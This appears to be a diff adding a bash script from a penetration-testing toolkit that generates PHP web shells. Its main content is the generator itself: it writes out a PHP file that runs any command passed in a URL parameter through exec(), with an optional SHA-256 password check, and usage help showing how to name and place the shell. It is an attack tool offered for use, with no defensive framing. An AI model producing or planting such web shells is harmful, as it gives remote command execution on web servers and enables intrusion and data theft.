@@ -1,0 +1,25 @@
+#!/bin/bash
+# Author Patrick Story
+# https://github.com/Patchyst
+# https://github.com/Patchyst/PatchyPack
+DIR=$(dirname $0)
+if [[ -z $1 ]] && [[ -z $2 ]]; then
+	echo -e "Desc: Used to generate a webshell"
+	echo -e "Required Usage: patchy genshell webshell_file webshell_name"
+	echo -e "Optional Usage: [-p]: set a password for php shell"
+	echo -e "	example: patshy genshell shell.php shell -p passw0rd!"
+	echo -e "		 patchy genshell /root/webshells/myshell.php nameofmyshell" 
+elif [[ ! -z $1 ]] && [[ -z $3 ]] ; then
+	echo "Generating $2 with no password"
+	echo "<?php echo exec(\$_GET['${2}']); ?>" > $1
+elif [[ ! -z $1 ]] && [[ $3 == "-p" ]] && [[ ! -z $4 ]]; then
+	HASHPASS=$(python3 ${dir}sha256hash.py $4)
+	echo "<?php define(\"PASSWORD\", \"$HASHPASS\"); function auth(\$pass){\$hashpass = hash(\"sha256\", \$pass); if (strcmp(PASSWORD, \$hashpass) == 0){ return TRUE; }else{ return FALSE; }}if (auth(\$_GET['password'])){echo exec(\$_GET['${2}']); }else{ echo \"\"; } ?>" > $1
+
+else
+	echo -e "Desc: Used to generate a webshell"
+	echo -e "Required Usage: patchy genshell webshell_file webshell_name"
+	echo -e "Optional Usage: [-p]: set a password for php shell"
+	echo -e "       example: patshy genshell shell.php shell -p passw0rd!"
+	echo -e "                patchy genshell /root/webshells/myshell.php nameofmyshell" 
+fi
